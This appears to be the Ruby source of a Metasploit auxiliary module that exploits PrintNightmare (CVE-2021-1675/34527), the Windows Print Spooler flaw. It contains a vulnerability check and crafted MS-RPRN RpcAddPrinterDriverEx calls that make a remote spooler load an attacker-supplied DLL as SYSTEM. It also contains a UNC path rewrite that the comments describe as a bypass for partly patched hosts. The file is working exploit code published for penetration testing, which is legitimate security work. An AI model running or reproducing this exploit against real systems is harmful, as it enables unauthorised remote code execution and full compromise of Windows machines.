##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'windows_error'
require 'ruby_smb'
require 'ruby_smb/error'

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client::Authenticated

  PrintSystem = RubySMB::Dcerpc::PrintSystem

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Print Spooler Remote DLL Injection',
        'Description' => %q{
          The print spooler service can be abused by an authenticated remote attacker to load a DLL through a crafted
          DCERPC request, resulting in remote code execution as NT AUTHORITY\SYSTEM. This module uses the MS-RPRN
          vector which requires the Print Spooler service to be running.
        },
        'Author' => [
          'Zhiniang Peng',           # vulnerability discovery / research
          'Xuefeng Li',              # vulnerability discovery / research
          'Zhipeng Huo',             # vulnerability discovery
          'Piotr Madej',             # vulnerability discovery
          'Zhang Yunhai',            # vulnerability discovery
          'cube0x0',                 # PoC
          'Spencer McIntyre',        # metasploit module
          'Christophe De La Fuente', # metasploit module co-author
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2021-1675'],
          ['CVE', '2021-34527'],
          ['URL', 'https://github.com/cube0x0/CVE-2021-1675'],
          ['URL', 'https://web.archive.org/web/20210701042336/https://github.com/afwu/PrintNightmare'],
          ['URL', 'https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1'],
          ['URL', 'https://github.com/byt3bl33d3r/ItWasAllADream']
        ],
        'Notes' => {
          'AKA' => [ 'PrintNightmare' ],
          'Stability' => [CRASH_SERVICE_DOWN],
          'Reliability' => [UNRELIABLE_SESSION],
          'SideEffects' => [
            ARTIFACTS_ON_DISK # the dll will be copied to the remote server
          ],
          'RelatedModules' => ['exploit/windows/dcerpc/cve_2021_1675_printnightmare']
        }
      )
    )

    register_options(
      [
        OptString.new('DLL_PATH', [ true, 'The network-based UNC path or local path on the remote target from which the server should load the DLL' ])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('ReconnectDelay', [ true, 'A delay in seconds to wait before reconnecting to the named pipe', 10 ])
      ]
    )
    deregister_options('AutoCheck')
  end

  def check
    begin
      connect(backend: :ruby_smb)
    rescue Rex::ConnectionError
      return Exploit::CheckCode::Unknown('Failed to connect to the remote service.')
    end

    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::LoginError
      return Exploit::CheckCode::Unknown('Failed to authenticate to the remote service.')
    end

    begin
      dcerpc_bind_spoolss
    rescue RubySMB::Error::UnexpectedStatusCode => e
      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
      if nt_status == ::WindowsError::NTStatus::STATUS_OBJECT_NAME_NOT_FOUND
        print_error("The 'Print Spooler' service is disabled.")
      end
      return Exploit::CheckCode::Safe("The DCERPC bind failed with error #{nt_status.name} (#{nt_status.description}).")
    end

    arch = dcerpc_getarch
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/e81cbc09-ab05-4a32-ae4a-8ec57b436c43
    if arch == ARCH_X64
      @environment = 'Windows x64'
    elsif arch == ARCH_X86
      @environment = 'Windows NT x86'
    else
      return Exploit::CheckCode::Detected('Successfully bound to the remote service.')
    end

    print_status("Target environment: Windows v#{simple.client.os_version} (#{arch})")

    print_status('Enumerating the installed printer drivers...')
    drivers = enum_printer_drivers(@environment)
    @driver_path = "#{drivers.driver_path.rpartition('\\').first}\\UNIDRV.DLL"
    vprint_status("Using driver path: #{@driver_path}")

    print_status('Retrieving the path of the printer driver directory...')
    @config_directory = get_printer_driver_directory(@environment)
    vprint_status("Using driver directory: #{@config_directory}") unless @config_directory.nil?

    container = driver_container(
      p_config_file: 'C:\\Windows\\System32\\kernel32.dll',
      p_data_file: "\\??\\UNC\\127.0.0.1\\#{Rex::Text.rand_text_alphanumeric(4..8)}\\#{Rex::Text.rand_text_alphanumeric(4..8)}.dll"
    )

    case add_printer_driver_ex(container)
    when nil # prevent the module from erroring out in case the response can't be mapped to a Win32 error code
      return Exploit::CheckCode::Unknown('Received unknown status code, implying the target is not vulnerable.')
    when ::WindowsError::Win32::ERROR_PATH_NOT_FOUND
      return Exploit::CheckCode::Vulnerable('Received ERROR_PATH_NOT_FOUND, implying the target is vulnerable.')
    when ::WindowsError::Win32::ERROR_BAD_NET_NAME
      return Exploit::CheckCode::Vulnerable('Received ERROR_BAD_NET_NAME, implying the target is vulnerable.')
    when ::WindowsError::Win32::ERROR_ACCESS_DENIED
      return Exploit::CheckCode::Safe('Received ERROR_ACCESS_DENIED implying the target is patched.')
    end

    Exploit::CheckCode::Detected('Successfully bound to the remote service.')
  end

  def run
    fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported.') if @environment.nil?
    fail_with(Failure::Unknown, 'Failed to enumerate the driver directory.') if @config_directory.nil?

    dll_path = datastore['DLL_PATH'].strip
    if dll_path =~ /^\\\\([\w:.\[\]]+)\\(.*)$/
      # targets patched for CVE-2021-34527 (but with Point and Print enabled) need to use this path style as a bypass
      # otherwise the operation will fail with ERROR_INVALID_PARAMETER
      dll_path = "\\??\\UNC\\#{Regexp.last_match(1)}\\#{Regexp.last_match(2)}"
    end
    vprint_status("Using DLL path: #{dll_path}")

    filename = dll_path.rpartition('\\').last
    container = driver_container(p_config_file: 'C:\\Windows\\System32\\kernel32.dll', p_data_file: dll_path)

    3.times do
      add_printer_driver_ex(container)
    end

    1.upto(3) do |directory|
      container.driver_info.p_config_file.assign("#{@config_directory}\\3\\old\\#{directory}\\#{filename}")
      add_printer_driver_ex(container)
    end
  end

  def driver_container(**kwargs)
    PrintSystem::DriverContainer.new(
      level: 2,
      tag: 2,
      driver_info: PrintSystem::DriverInfo2.new(
        c_version: 3,
        p_name_ref_id: 0x00020000,
        p_environment_ref_id: 0x00020004,
        p_driver_path_ref_id: 0x00020008,
        p_data_file_ref_id: 0x0002000c,
        p_config_file_ref_id: 0x00020010,
        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913
        p_name: "#{Rex::Text.rand_text_alpha_upper(2..4)} #{Rex::Text.rand_text_numeric(2..3)}",
        p_environment: @environment,
        p_driver_path: @driver_path,
        **kwargs
      )
    )
  end

  def dcerpc_bind_spoolss
    handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
    vprint_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    vprint_status("Bound to #{handle} ...")
  end

  def enum_printer_drivers(environment)
    response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2)
    response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2, p_drivers: [0] * response.pcb_needed, cb_buf: response.pcb_needed)
    fail_with(Failure::UnexpectedReply, 'Failed to enumerate printer drivers.') unless response.p_drivers&.length
    DriverInfo2.read(response.p_drivers.map(&:chr).join)
  end

  def get_printer_driver_directory(environment)
    response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2)
    response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2, p_driver_directory: [0] * response.pcb_needed, cb_buf: response.pcb_needed)
    fail_with(Failure::UnexpectedReply, 'Failed to obtain the printer driver directory.') unless response.p_driver_directory&.length
    RubySMB::Field::Stringz16.read(response.p_driver_directory.map(&:chr).join).encode('ASCII-8BIT')
  end

  def add_printer_driver_ex(container)
    reconnect = true
    flags = PrintSystem::APD_INSTALL_WARNED_DRIVER | PrintSystem::APD_COPY_FROM_DIRECTORY | PrintSystem::APD_COPY_ALL_FILES

    begin
      response = rprn_call('RpcAddPrinterDriverEx', p_name: "\\\\#{datastore['RHOST']}", p_driver_container: container, dw_file_copy_flags: flags)
    rescue RubySMB::Error::UnexpectedStatusCode => e
      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
      message = "Error #{nt_status.name} (#{nt_status.description})"
      if nt_status == ::WindowsError::NTStatus::STATUS_PIPE_BROKEN
        # STATUS_PIPE_BROKEN is the return value when the payload is executed, so this is somewhat expected
        fail_with(Failure::Disconnected, 'The named pipe connection was broken.') unless reconnect
        reconnect = false

        # TODO: switch this to retry_until_truthy once #16555 is landed
        print_status("The named pipe connection was broken, reconnecting after a #{datastore['ReconnectDelay'].to_i} second delay.")
        sleep datastore['ReconnectDelay'].to_i
        begin
          dcerpc_bind_spoolss
        rescue RubySMB::Error::UnexpectedStatusCode => e
          fail_with(Failure::Unreachable, 'Failed to reconnect to the named pipe.')
        end

        retry
      else
        print_error(message)
      end

      return nt_status
    end

    error = ::WindowsError::Win32.find_by_retval(response.error_status.value).first
    message = "RpcAddPrinterDriverEx response #{response.error_status}"
    message << " #{error.name} (#{error.description})" unless error.nil?
    vprint_status(message)
    error
  end

  def rprn_call(name, **kwargs)
    request = PrintSystem.const_get("#{name}Request").new(**kwargs)

    begin
      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      fail_with(Failure::UnexpectedReply, "The #{name} Print System RPC request failed (#{e.message}).")
    end

    PrintSystem.const_get("#{name}Response").read(raw_response)
  end

  class DriverInfo2Header < BinData::Record
    endian :little

    uint32     :c_version
    uint32     :name_offset
    uint32     :environment_offset
    uint32     :driver_path_offset
    uint32     :data_file_offset
    uint32     :config_file_offset
  end

  # this is a partial implementation that just parses the data, this is *not* the same struct as PrintSystem::DriverInfo2
  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030
  DriverInfo2 = Struct.new(:header, :name, :environment, :driver_path, :data_file, :config_file) do
    def self.read(data)
      header = DriverInfo2Header.read(data)
      new(
        header,
        RubySMB::Field::Stringz16.read(data[header.name_offset..]).encode('ASCII-8BIT'),
        RubySMB::Field::Stringz16.read(data[header.environment_offset..]).encode('ASCII-8BIT'),
        RubySMB::Field::Stringz16.read(data[header.driver_path_offset..]).encode('ASCII-8BIT'),
        RubySMB::Field::Stringz16.read(data[header.data_file_offset..]).encode('ASCII-8BIT'),
        RubySMB::Field::Stringz16.read(data[header.config_file_offset..]).encode('ASCII-8BIT')
      )
    end
  end
end
